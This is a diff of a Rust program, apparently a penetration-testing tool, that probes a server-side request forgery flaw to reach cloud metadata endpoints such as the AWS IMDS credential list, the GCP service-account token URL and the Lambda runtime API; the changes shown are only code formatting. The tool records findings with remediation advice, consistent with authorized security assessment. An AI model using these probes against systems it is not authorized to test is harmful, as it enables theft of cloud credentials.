@@ -33,8 +33,7 @@ const DEFAULT_TIMEOUT_SECS: u64 = 15;
 // AWS IMDS endpoints
 const AWS_CRED_LIST_PATH: &str =
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
-const AWS_LAMBDA_RUNTIME_PATH: &str =
-    "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next";
+const AWS_LAMBDA_RUNTIME_PATH: &str = "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next";
 // GCP metadata endpoint — requires Metadata-Flavor: Google header (injected by target)
 const GCP_TOKEN_PATH: &str =
     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token";
@@ -124,9 +123,7 @@ fn mask_value(val: &str) -> String {
 // Build the SSRF probe URL by appending the metadata URL as a query param
 fn build_ssrf_probe(ssrf_url: &str, metadata_url: &str) -> Result<String> {
     let mut parsed = Url::parse(ssrf_url).context("parse ssrf-url")?;
-    parsed
-        .query_pairs_mut()
-        .append_pair("url", metadata_url);
+    parsed.query_pairs_mut().append_pair("url", metadata_url);
     Ok(parsed.to_string())
 }
 
@@ -222,8 +219,9 @@ async fn main() -> Result<()> {
 
     // AWS: probe credential list to get role name
     eprintln!("  probing AWS IMDS cred list...");
-    let (cred_list_accessible, role_name) =
-        probe_aws_cred_list(&client, &args.ssrf_url).await.unwrap_or((false, None));
+    let (cred_list_accessible, role_name) = probe_aws_cred_list(&client, &args.ssrf_url)
+        .await
+        .unwrap_or((false, None));
 
     if cred_list_accessible {
         let role = role_name.as_deref().unwrap_or("").to_string();
@@ -275,8 +273,7 @@ async fn main() -> Result<()> {
 
     // Lambda runtime invocation API
     eprintln!("  probing Lambda runtime API...");
-    let (runtime_accessible, runtime_body) =
-        probe_lambda_runtime(&client, &args.ssrf_url).await;
+    let (runtime_accessible, runtime_body) = probe_lambda_runtime(&client, &args.ssrf_url).await;
 
     if runtime_accessible {
         eprintln!("  [HIGH] Lambda runtime event exposed");
@@ -284,8 +281,7 @@ async fn main() -> Result<()> {
         probes.push(ProbeResult {
             label: "Lambda Runtime Invocation".to_string(),
             metadata_url: AWS_LAMBDA_RUNTIME_PATH.to_string(),
-            ssrf_url: build_ssrf_probe(&args.ssrf_url, AWS_LAMBDA_RUNTIME_PATH)
-                .unwrap_or_default(),
+            ssrf_url: build_ssrf_probe(&args.ssrf_url, AWS_LAMBDA_RUNTIME_PATH).unwrap_or_default(),
             accessible: true,
             severity: Some(Severity::High),
             detail: "Lambda pending invocation event exposed via SSRF".to_string(),
@@ -295,8 +291,7 @@ async fn main() -> Result<()> {
         probes.push(ProbeResult {
             label: "Lambda Runtime Invocation".to_string(),
             metadata_url: AWS_LAMBDA_RUNTIME_PATH.to_string(),
-            ssrf_url: build_ssrf_probe(&args.ssrf_url, AWS_LAMBDA_RUNTIME_PATH)
-                .unwrap_or_default(),
+            ssrf_url: build_ssrf_probe(&args.ssrf_url, AWS_LAMBDA_RUNTIME_PATH).unwrap_or_default(),
             accessible: false,
             severity: None,
             detail: "Not accessible".to_string(),
@@ -363,7 +358,7 @@ async fn main() -> Result<()> {
                 .recommendation(
                     "Remediate the SSRF vulnerability that allows reaching the IMDS endpoint; \
                      enforce IMDSv2 (require session tokens); restrict Lambda execution roles \
-                     to least-privilege; rotate any exposed credentials immediately"
+                     to least-privilege; rotate any exposed credentials immediately",
                 );
             let _ = write_finding(&eng, &tf);
         }
